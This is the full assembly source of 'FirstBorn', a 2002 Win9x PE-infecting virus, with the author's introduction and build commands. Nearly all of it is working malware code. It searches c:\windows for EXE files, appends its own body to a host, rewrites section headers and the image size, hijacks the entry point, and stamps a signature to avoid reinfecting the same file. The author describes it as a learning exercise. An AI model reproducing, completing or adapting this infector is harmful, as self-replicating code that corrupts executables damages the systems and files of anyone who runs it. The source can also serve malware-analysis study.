;
; [ Win9x.FirstBorn         Vorgon ]       
; [ 2560 bytes         Target - PE ]        
; [ 08/10/02        Made in Canada ]
; 
;
;
;
; [ Introduction ]
;
; After three or four years of programming in asm i decided i was ready for  
; somthing more challenging. Virus programming had always interested me so
; i went searching for a group that would teach me the basics. I found the
; group iKX, and T00FiC showed me how to make my first virus which i call 
; FirstBorn. Its a sucky virus and would never survive in the wild, i only 
; made it for learning purposes.
;
; [ The Infection ]
;
; FirstBorn is a simple PE infector. It only works on Win9x because i could
; not get the exception handling part of the Kernel finder working. So it
; just assumes the kernel is located at 0BFF70000. I will have this function
; working in my next virus and then it can infect NT and 2k. Below is
; a break down of what the virus does:
;
; - Get the delta offset and save the starting location of the virus
; - Save registers incase the host program needs them
; - Use the GetFunctionAddress procedure to get the kernel32 api function
;   addreses i need.
; - Call the FindHostFile procedure to find a valid PE file to infect.
; - Call the GetHeader procedure which reads the PE header into memory
; - Call the AddCodeToHost procedure which does many things:
;              - Writes this program in memory to the end of the host file
;              - Updates the last section header to include all the data
;                up to the EOF, Updates its virtual size, and makes it
;                Readable/Writable/Executable
;              - Updates the program image size
;              - Sets the entry point to the virus code
;              - Adds a signature to location 79h to stop another infection
; - Call PutHeader procedure which writes the updated PE Header to the host 
; - Restore registers for the host program
; - Returns control to the host program
;
;
; [ Assembling ]
;
; tasm32 /ml 1born
; tlink32 -x /Tpe /c 1born,1born
; editbin /SECTION:CODE,rwe 1born.exe
;
;

.386p
.model flat, stdcall
extrn           ExitProcess : PROC
.DATA
        dd 0
.CODE
Main:
        
;----------------------------------------------------------------------------
; Get delta offset and the start location of the virus in memory
;----------------------------------------------------------------------------

        push    ebp
        call    GetDeltaPointer
GetDeltaPointer:
        pop     ebp
        sub     ebp, offset GetDeltaPointer

        Call    SaveRegisters

        mov     [ebp+StartOfCode], ebp
        lea     eax, GetDeltaPointer
        add     [ebp+StartOfCode], eax
        sub     [ebp+StartOfCode], 6               ;get the start address of virus in memory

        mov     eax, [ebp+HEP2]                    ;Set the return to host address
        mov     [ebp+HostEntryPoint], eax
       
;----------------------------------------------------------------------------
; Virus Data
;----------------------------------------------------------------------------

jmp JumpOverData
        StartOfCode        dd 0
        VirusSignature     dd 0DEADBEEFh

        Handle             dd 0
        NumberOfBytesRead  dd 0

        PE_Header          db 248 dup(0)
        LocationOfHeader   dd 0
        
        SearchString       db 'c:\windows\*.EXE',0
        FindHandle         dd 0

Win32_Find_Data:
        FileAttributes     dd 0
        CreateTime         dq 0
        LastAccessTime     dq 0
        LastWriteTime      dq 0
        FileSizeHigh       dd 0
        FileSizeLow        dd 0
        Reserved0          dd 0
        Reserved1          dd 0
        FullFileName       db 260 dup(0)
        AlternateFileName  db 14 dup(0)

SectionHeader:      
        ANSI_Name          db 8 dup(0)
        VirtualSize        dd 0
        VirtualAddress     dd 0
        SizeOfRawData      dd 0
        PointerToRawData   dd 0
        PointerToRelocs    dd 0
        PointerToLinNums   dd 0
        NumberOfRelocs     dw 0
        NumberOfLineNums   dw 0
        Characteristics    dd 0

        Kernel32Address    dd 0BFF70000h         

        szCreateFileA      db 'CreateFileA',0
        _CreateFileA       dd 0
        szWriteFile        db 'WriteFile',0
        _WriteFile         dd 0
        szCloseHandle      db 'CloseHandle',0
        _CloseHandle       dd 0
        szReadFile         db 'ReadFile',0
        _ReadFile          dd 0
        szSetFilePointer   db 'SetFilePointer',0
        _SetFilePointer    dd 0
        szFindFirstFileA   db 'FindFirstFileA',0
        _FindFirstFileA    dd 0
        szFindNextFileA    db 'FindNextFileA',0
        _FindNextFileA     dd 0
        szFindClose        db 'FindClose',0
        _FindClose         dd 0

        loc  dd 0
        loc2 dd 0

        HostEntryPoint     dd 0
        HEP2               dd 00401000h

        _EBP               dd 0
        _EDI               dd 0
        _ESI               dd 0
        _EAX               dd 0
        _EBX               dd 0
        _ECX               dd 0
        _EDX               dd 0

        FirstGeneration    dd 1

JumpOverData:

;----------------------------------------------------------------------------
; Get the required API function addresses from the Kernel32.dll
;----------------------------------------------------------------------------  
        lea     esi, [ebp+szCreateFileA]
        call    GetFunctionAddress
        mov     [ebp+_CreateFileA], eax

        lea     esi, [ebp+szWriteFile]
        call    GetFunctionAddress
        mov     [ebp+_WriteFile], eax

        lea     esi, [ebp+szCloseHandle]
        call    GetFunctionAddress
        mov     [ebp+_CloseHandle], eax
       
        lea     esi, [ebp+szReadFile]
        call    GetFunctionAddress
        mov     [ebp+_ReadFile], eax

        lea     esi, [ebp+szSetFilePointer]
        call    GetFunctionAddress
        mov     [ebp+_SetFilePointer], eax

        lea     esi, [ebp+szFindFirstFileA]
        call    GetFunctionAddress
        mov     [ebp+_FindFirstFileA], eax

        lea     esi, [ebp+szFindNextFileA]
        call    GetFunctionAddress
        mov     [ebp+_FindNextFileA], eax

        lea     esi, [ebp+szFindClose]
        call    GetFunctionAddress
        mov     [ebp+_FindClose], eax
      
;----------------------------------------------------------------------------
; Main
;----------------------------------------------------------------------------
        
        Call    FindHostFile                        ;Find an exe to infect
        cmp     eax, 0FFFFFFFFh
        je      BackToHost

        lea     eax, [ebp+FullFileName]             ;Open it
        mov     ebx, 0C0000000h
        call    OpenFile
        cmp     eax, 0FFFFFFFFh
        je      BackToHost
       
        call    GetHeader                           ;Get its PE header

        call    AddCodeToHost                       ;Add virus to it

        call    PutHeader                           ;Write the updated PE header
                                                    ;to it
        mov     eax, [ebp+Handle]                   
        call    CloseFile                           ;Close it

BackToHost:
        cmp	dword ptr [ebp+FirstGeneration], 1
        je	Exit

        mov     eax, dword ptr [ebp+HostEntryPoint]
        push    eax
        Call    RestoreRegisters
        ret                                         ;return to host

Exit:
        push	0
        Call	ExitProcess

;----------------------------------------------------------------------------
; General Procedures
;----------------------------------------------------------------------------
SaveRegisters PROC      
        mov	[ebp+_EDI], edi
        mov	[ebp+_ESI], esi
        mov	[ebp+_EBX], ebx
        mov	[ebp+_ECX], ecx
        mov	[ebp+_EDX], edx
        pop	eax
        pop	ebx
        mov	[ebp+_EBP], ebx
        push	eax
        ret
SaveRegisters ENDP

RestoreRegisters PROC
        mov	edi, [ebp+_EDI]
        mov	esi, [ebp+_ESI]
        mov	ebx, [ebp+_EBX]
        mov	ecx, [ebp+_ECX]
        mov	edx, [ebp+_EDX]
        mov	ebp, [ebp+_EBP] 
        ret
RestoreRegisters ENDP

AddCodeToHost PROC
        push    dword ptr [ebp+FirstGeneration]
        mov     dword ptr [ebp+FirstGeneration], 0

        mov     eax, dword ptr [ebp+PE_Header+40]
        add     eax, dword ptr [ebp+PE_Header+52]   ;add image base
        mov     [ebp+HEP2], eax                     ;Save original entry point

        mov     eax, 0
        mov     ebx, 2
        Call    SeekData                            ;Seek to EOF
        mov     [ebp+loc], eax
        add     [ebp+loc], 2560                     ;loc = new EOF

        mov     eax, [ebp+StartOfCode]
        mov     ebx, 2560
        call    PutData                             ;Write virus to EOF

        xor     edx, edx
        xor     eax, eax
        mov     ax, word ptr [ebp+PE_Header+6] 
        dec     eax
        mov     ebx, 40
        mul     ebx
        add     eax, [ebp+LocationOfHeader]
        add     eax, 248            
        mov     ebx, 0
        Call    SeekData                            ;Seek to the last section header

        lea     eax, [ebp+SectionHeader]
        mov     ebx, 40
        Call    GetData                             ;Get the last section header

        mov     eax, dword ptr [ebp+PE_Header+80]
        sub     eax, [ebp+VirtualSize]
        mov     dword ptr [ebp+PE_Header+80], eax   ;subtract the section size from the image size

        mov     eax, [ebp+loc]
        sub     eax, [ebp+PointerToRawData]   
        mov     [ebp+SizeOfRawData], eax            ;Update SizeOfRawData

        shr     eax, 12                             ;divide eax by 4096
        shl     eax, 12                             ;multiply eax by 4096
        add     eax, 8192                           ;add 1 - 2k for any unitialized data
        mov     [ebp+VirtualSize], eax              ;Update VirtualSize
        
        mov     eax, [ebp+SizeOfRawData]
        sub     eax, 2560
        add     eax, [ebp+VirtualAddress]
        mov     dword ptr [ebp+PE_Header+40], eax   ;Set Entry point

        mov     [ebp+Characteristics], 0E0000020h   ;Make Section Executable/Readable/Writable

        mov     eax, -40
        mov     ebx, 1
        Call    SeekData
        lea     eax, [ebp+SectionHeader]
        mov     ebx, 40
        Call    PutData                             ;Write section header back to file

        mov     eax, dword ptr [ebp+PE_Header+80]
        add     eax, [ebp+VirtualSize]
        mov     dword ptr [ebp+PE_Header+80], eax   ;update image size

        mov     eax, 79h
        mov     ebx, 0
        Call    SeekData
        lea     eax, [ebp+VirusSignature]
        mov     ebx, 4
        Call    PutData                             ;Write Virus Signature to host
                                                    ;to prevent reinfection
        pop     dword ptr [ebp+FirstGeneration]
        ret
AddCodeToHost ENDP

FindHostFile PROC

        lea	eax, [ebp+Win32_Find_Data]
        lea	ebx, [ebp+SearchString]
        push	eax
        push	ebx
        Call	[ebp+_FindFirstFileA]
        mov	[ebp+FindHandle], eax               ;Get First File match
        
FindHost:
        lea	eax, [ebp+FullFileName]
        mov	ebx, 0C0000000h
        call	OpenFile
        cmp	eax, 0FFFFFFFFh
        je	FindNext
        mov	[ebp+Handle], eax

        mov	eax, 79h
        mov	ebx, 0
        Call	SeekData
        lea	eax, [ebp+loc]
        mov	ebx, 4
        Call	GetData

        mov	eax, 3Ch
        mov	ebx, 0
        Call	SeekData
        lea	eax, [ebp+loc2]
        mov	ebx, 4
        Call	GetData
        mov	eax, [ebp+loc2]
        mov	ebx, 0
        Call	SeekData
        lea	eax, [ebp+loc2]
        mov	ebx, 4
        Call	GetData                      ;Get PE signature

        mov	eax, [ebp+Handle]
        Call	CloseFile

        cmp	[ebp+loc], 0DEADBEEFh
        jne	NextCheck                 ;Already Infected?
        je	FindNext

NextCheck:
        cmp	[ebp+loc2], 00004550h     ;Valid PE EXE?
        je	FoundHost

FindNext:
        lea	eax, [ebp+Win32_Find_Data]
        push	eax
        push	[ebp+FindHandle]
        Call	[ebp+_FindNextFileA]
        cmp	eax, 0                    ;No more exes left
        je	HostNotFound 
        jmp	FindHost       

FoundHost:        
        push	[ebp+FindHandle]
        Call	[ebp+_FindClose]
        ret

HostNotFound:
        push	[ebp+FindHandle]
        Call	[ebp+_FindClose]
        mov	eax, 0FFFFFFFFh
        ret
FindHostFile ENDP


GetHeader PROC
        mov     eax, 3Ch
        mov     ebx, 0
        call    SeekData
        lea     eax, [ebp+LocationOfHeader]
        mov     ebx, 4
        call    GetData
        mov     eax, [ebp+LocationOfHeader]
        mov     ebx, 0
        call    SeekData
        lea     eax, [ebp+PE_Header]
        mov     ebx, 248
        call    GetData
        ret
GetHeader ENDP

PutHeader PROC
        mov     eax, 3Ch
        mov     ebx, 0
        call    SeekData
        lea     eax, [ebp+LocationOfHeader]
        mov     ebx, 4
        call    GetData
        mov     eax, [ebp+LocationOfHeader]
        mov     ebx, 0
        call    SeekData
        lea     eax, [ebp+PE_Header]
        mov     ebx, 248
        call    PutData
        ret
PutHeader ENDP

GetFunctionAddress PROC
        mov     eax, [ebp+Kernel32Address]          ;EAX = Kernel32 Address
        mov     ebx, [eax+3Ch]
        add     ebx, eax
        add     ebx, 120
        mov     ebx, [ebx]
        add     ebx, eax                            ;EBX = Export Address

        xor     edx, edx
        mov     ecx, [ebx+32]
        add     ecx, eax
        push    esi
        push    edx
CompareNext:
        pop     edx
        pop     esi
        inc     edx
        mov     edi, [ecx]
        add     edi, eax
        add     ecx, 4
        push    esi
        push    edx
CompareName:
        mov     dl, [edi]
        mov     dh, [esi]
        cmp     dl, dh
        jne     CompareNext
        inc     edi
        inc     esi
        cmp     byte ptr [esi], 0
        je      GetAddress
        jmp     CompareName
GetAddress:
        pop     edx
        pop     esi
        dec     edx
        shl     edx, 1        
        mov     ecx, [ebx+36]
        add     ecx, eax
        add     ecx, edx
        xor     edx, edx
        mov     dx, [ecx]
        shl     edx, 2
        mov     ecx, [ebx+28]
        add     ecx, eax
        add     ecx, edx
        add     eax, [ecx]

        ret
GetFunctionAddress ENDP


;----------------------------------------------------------------------------
; File I/O Procedures
;----------------------------------------------------------------------------

OpenFile PROC
        push    00000000h
        push    00000080h
        push    00000003h
        push    00000000h
        push    00000000h
        push    ebx                                ;open for read/write
        push    eax 
        call    [ebp+_CreateFileA]
        mov     [ebp+Handle], eax
        ret
OpenFile ENDP

CloseFile PROC
        push    eax
        call    [ebp+_CloseHandle]
        ret
CloseFile ENDP

SeekData PROC
        push    ebx                                 ; 0 = begin / 1 = current / 2 = end
        push    0
        push    eax                                 ; location to seek to
        push    [ebp+Handle]
        call    [ebp+_SetFilePointer]
        ret
SeekData ENDP

GetData PROC
        lea     ecx, [ebp+NumberOfBytesRead]
        push    00000000h
        push    ecx
        push    ebx
        push    eax
        push    [ebp+Handle]                           
        call    [ebp+_ReadFile]
        ret
GetData ENDP

PutData PROC
        lea     ecx, [ebp+NumberOfBytesRead]
        push    0
        push    ecx
        push    ebx
        push    eax
        push    [ebp+Handle]
        call    [ebp+_WriteFile]
        ret
PutData ENDP

End   Main

;Wow your actualy still reading? Get a life :p

